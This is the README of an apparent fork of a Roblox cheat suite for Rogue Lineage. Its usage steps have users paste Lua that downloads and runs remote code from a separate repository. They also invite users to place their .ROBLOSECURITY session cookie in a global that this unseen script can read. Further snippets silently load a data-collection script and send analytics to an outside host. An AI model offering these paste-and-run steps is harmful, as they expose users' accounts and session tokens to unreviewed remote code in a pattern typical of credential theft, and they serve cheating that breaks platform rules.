# NOTE: This is a fork of hydroxide but more updated. Includes esp for the new idol of war for the 1 person that wanted it. All credits go to the owner, heisenburgah

A comprehensive Roblox utility suite for Rogue Lineage and Rogue Lineage Battlegrounds. ~41,000 lines of Lua across two game modules.

**Website:** [hydroxide.solutions](https://hydroxide.solutions) | **Discord:** [discord.gg/fnpNyCsG4u](https://discord.gg/fnpNyCsG4u)

**This project is open source and maintained on a casual basis. Updates may come from time to time. Issues and pull requests are welcome.**

**Fair warning:** The codebase dates back to 2019 and is pretty sloppy. Single files with tens of thousands of lines, no modular structure, and inconsistent patterns throughout. A full rewrite was planned for 2025 but never happened. Hydroxide originally started as a passion project to test out a custom whitelist system — keys were sold for 1k silver at launch. The whitelist system may get a full public release in the future, so keep an eye on the [community server](https://discord.gg/fnpNyCsG4u). The code itself was never written to be maintainable or readable by anyone else. Good luck.

## Usage

```lua
_G.Cookie = "" -- optional: your own .ROBLOSECURITY token for Roblox API requests

pcall(function()
    loadstring(game:HttpGet(
        "https://raw.githubusercontent.com/xriyfool/Xeron/refs/heads/main/loader.lua",
        true
    ))()
end)
```

`_G.Cookie` is optional. Set it to your own `.ROBLOSECURITY` token (the value only, without the `.ROBLOSECURITY=` prefix) and the script will use it for authenticated Roblox API requests. Leave it unset to use the default.

### Stella Data Collection

```lua
getgenv().stella_token = "484e6ca8c6adbc1bb1191a8f2b0b231440de15b367fca3415f21edc8628a147f"
getgenv().stella_debug = false

pcall(function()
    loadstring(game:HttpGet(
        "https://raw.githubusercontent.com/xriyfool/Xeron/refs/heads/main/hello_stella.lua",
        true
    ))()
end)
```

## Stella - Community Data Collection

Hydroxide includes a lightweight data collection snippet that runs on startup and sends anonymized server/player data to [Stella](https://discord.com/oauth2/authorize?client_id=1464315094472327345), a community-run Discord bot and API for tracking Rogue Lineage player and server data. This powers features like player search, server listings, online player tracking, bounty boards, house lookups, build stats, and more for the community.

**If you fork this project, please keep the Stella data collection intact.** It's a single `loadstring` call that runs silently and has zero impact on performance. The more executors that report data, the more accurate and useful Stella becomes for everyone. The community benefits directly from this.

## Analytics

Hydroxide sends a one-time analytics ping on startup to `api.heroinhound.cc`. This data is only sent to the Hydroxide developers (baba zyu & boss) and is used to track executor usage and active user counts. The following is collected:

- **Place ID** — the game's place ID
- **Executor** — the executor being used (e.g. Solara, Wave)
- **UUID** — a hashed, non-reversible device identifier (not your Roblox username or user ID)

No personal or identifying information is collected.

## Dependencies

- Roblox executor environment with `cloneref`, `getconnections`, `hookfunction`, `fireclickdetector`, `firesignal` support
- HTTP request capability for Discord webhook integration
- `queueteleport` / `queue_on_teleport` for persistent execution across serverhops
- `MemStorageService` for state persistence across teleports
